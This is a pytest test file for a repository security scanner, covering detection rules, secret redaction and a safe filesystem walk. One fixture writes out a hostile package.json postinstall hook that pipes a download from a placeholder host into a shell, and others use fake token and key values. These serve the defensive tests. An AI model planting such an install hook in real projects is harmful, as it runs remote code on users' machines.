"""Offline tests for repository static review heuristics and safe walking."""

from __future__ import annotations

import os

import pytest

from scanner import repository_security_scanner as scanner


def _analyze(path: str, content: bytes):
    findings = []
    seen = set()
    error = scanner._analyze_file(path, content, findings, seen)
    return findings, error


def test_package_lifecycle_script_is_reviewed_without_echoing_command():
    findings, error = _analyze(
        "package.json",
        b'{"scripts":{"postinstall":"curl https://example.invalid/x | sh"}}',
    )

    assert error is None
    ids = {finding.rule_id for finding in findings}
    assert "package-lifecycle-script" in ids
    assert "download-piped-to-shell" in ids
    assert all("curl https" not in finding.evidence for finding in findings)


def test_secret_indicators_are_redacted_from_report():
    token = b"ghp_" + b"A" * 35
    findings, _ = _analyze(
        "src/config.py",
        b"-----BEGIN PRIVATE KEY-----\n" + token,
    )

    assert {finding.rule_id for finding in findings} == {
        "private-key-material", "token-like-value",
    }
    serialized = " ".join(finding.evidence for finding in findings)
    assert token.decode() not in serialized
    assert "redacted" in serialized


def test_external_dependency_source_is_flagged_for_review():
    findings, _ = _analyze("requirements.txt", b"demo @ https://example.invalid/demo.whl\n")
    assert any(item.rule_id == "external-dependency-source" for item in findings)


def test_malformed_package_manifest_is_explicitly_incomplete():
    findings, error = _analyze("package.json", b"{not json")
    assert error and "JSONDecodeError" in error
    assert any(item.rule_id == "malformed-package-manifest" for item in findings)


@pytest.mark.parametrize(
    ("manifest", "expected_error"),
    [
        (b"[]", "top-level JSON value is not an object"),
        (b'{"scripts":[]}', "scripts value is not an object"),
        (b'{"scripts":{"postinstall":7}}', "script values must be strings"),
    ],
)
def test_structurally_invalid_package_manifest_is_not_treated_as_reviewed(
    manifest, expected_error,
):
    findings, error = _analyze("package.json", manifest)

    assert error and expected_error in error
    assert any(item.rule_id == "malformed-package-manifest" for item in findings)


@pytest.mark.skipif(os.name != "posix", reason="safe directory-descriptor walk requires POSIX")
def test_structurally_invalid_package_manifest_makes_scan_incomplete(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    (root / "package.json").write_text('{"scripts":[]}', encoding="utf-8")

    result = scanner.scan_repository_security(root)

    assert result.status == "incomplete"
    assert result.coverage_complete is False
    assert any("scripts value is not an object" in error for error in result.errors)
    assert any(item.rule_id == "malformed-package-manifest" for item in result.findings)


@pytest.mark.skipif(os.name != "posix", reason="safe directory-descriptor walk requires POSIX")
def test_repository_scan_does_not_execute_repository_script(tmp_path):
    root = tmp_path / "repo"
    root.mkdir()
    marker = tmp_path / "executed.txt"
    script = root / "install.sh"
    script.write_text(f"#!/bin/sh\nprintf bad > {marker}\n", encoding="utf-8")

    result = scanner.scan_repository_security(root)

    assert result.status == "completed"
    assert result.files_inspected == 1
    assert not marker.exists()


@pytest.mark.skipif(os.name != "posix", reason="safe directory-descriptor walk requires POSIX")
def test_repository_walk_skips_git_and_reviews_untracked_files(tmp_path):
    root = tmp_path / "repo"
    (root / ".git").mkdir(parents=True)
    (root / ".git" / "credential.txt").write_text("AKIA1234567890ABCDEF", encoding="utf-8")
    (root / "untracked.sh").write_text("#!/bin/sh\necho ordinary\n", encoding="utf-8")
    (root / "package.json").write_text(
        '{"scripts":{"install":"node setup.js"}}', encoding="utf-8",
    )

    result = scanner.scan_repository_security(root)

    assert result.status == "requires_review"
    assert result.coverage_complete is True
    assert result.files_inspected == 2
    assert any(item.rule_id == "package-lifecycle-script" for item in result.findings)
    assert all(".git/" not in item.path for item in result.findings)


@pytest.mark.skipif(os.name != "posix", reason="safe directory-descriptor walk requires POSIX")
def test_repository_walk_marks_symlink_and_oversized_file_incomplete(tmp_path, monkeypatch):
    root = tmp_path / "repo"
    root.mkdir()
    (root / "large.txt").write_text("x" * 32, encoding="utf-8")
    outside = tmp_path / "outside.txt"
    outside.write_text("ghp_" + "A" * 35, encoding="utf-8")
    try:
        (root / "linked.txt").symlink_to(outside)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation unavailable")
    monkeypatch.setattr(scanner, "MAX_FILE_BYTES", 16)

    result = scanner.scan_repository_security(root)

    assert result.status == "incomplete"
    assert result.coverage_complete is False
    assert result.files_inspected == 0
    assert result.limitations
    assert not result.findings


@pytest.mark.skipif(os.name != "posix", reason="safe directory-descriptor walk requires POSIX")
def test_repository_walk_bounds_one_directory_before_materializing_all_names(tmp_path, monkeypatch):
    root = tmp_path / "repo"
    root.mkdir()
    for index in range(5):
        (root / f"file-{index}.txt").write_text("content", encoding="utf-8")
    monkeypatch.setattr(scanner, "MAX_DIRECTORY_ENTRIES", 3)

    result = scanner.scan_repository_security(root)

    assert result.status == "incomplete"
    assert result.coverage_complete is False
    assert result.files_inspected <= 3
    assert any("per-directory entry limit" in item for item in result.limitations)


@pytest.mark.skipif(os.name != "posix", reason="safe directory-descriptor walk requires POSIX")
def test_repository_walk_stops_before_python_recursion_limit(tmp_path, monkeypatch):
    root = tmp_path / "repo"
    current = root
    current.mkdir()
    for index in range(6):
        current = current / f"d{index}"
        current.mkdir()
    (current / "file.txt").write_text("content", encoding="utf-8")
    monkeypatch.setattr(scanner, "MAX_DIRECTORY_DEPTH", 3)

    result = scanner.scan_repository_security(root)

    assert result.status == "incomplete"
    assert result.coverage_complete is False
    assert any("directory-depth limit" in item for item in result.limitations)


@pytest.mark.skipif(os.name != "posix", reason="safe directory-descriptor walk requires POSIX")
def test_repository_walk_rejects_file_changed_during_read_even_if_mtime_is_restored(
    tmp_path, monkeypatch,
):
    root = tmp_path / "repo"
    root.mkdir()
    source = root / "source.txt"
    source.write_text("ordinary content", encoding="utf-8")
    original_stat = source.stat()
    real_read = os.read
    changed = False

    def mutate_after_read(fd, count):
        nonlocal changed
        data = real_read(fd, count)
        if not changed:
            changed = True
            source.chmod(0o600)
            os.utime(source, ns=(original_stat.st_atime_ns, original_stat.st_mtime_ns))
        return data

    monkeypatch.setattr(scanner.os, "read", mutate_after_read)
    result = scanner.scan_repository_security(root)

    assert changed
    assert result.status == "incomplete"
    assert result.coverage_complete is False
    assert result.files_inspected == 0
    assert any("changed during static review" in item for item in result.limitations)


def test_scanner_reports_unavailable_when_safe_walk_is_not_supported(tmp_path, monkeypatch):
    monkeypatch.setattr(scanner, "_supports_safe_walk", lambda: False)
    result = scanner.scan_repository_security(tmp_path)
    assert result.status == "unavailable"
    assert result.coverage_complete is False
    assert result.errors


def test_missing_repository_path_is_reported_as_error(tmp_path):
    result = scanner.scan_repository_security(tmp_path / "missing")

    assert result.status == "error"
    assert result.coverage_complete is False
    assert result.errors
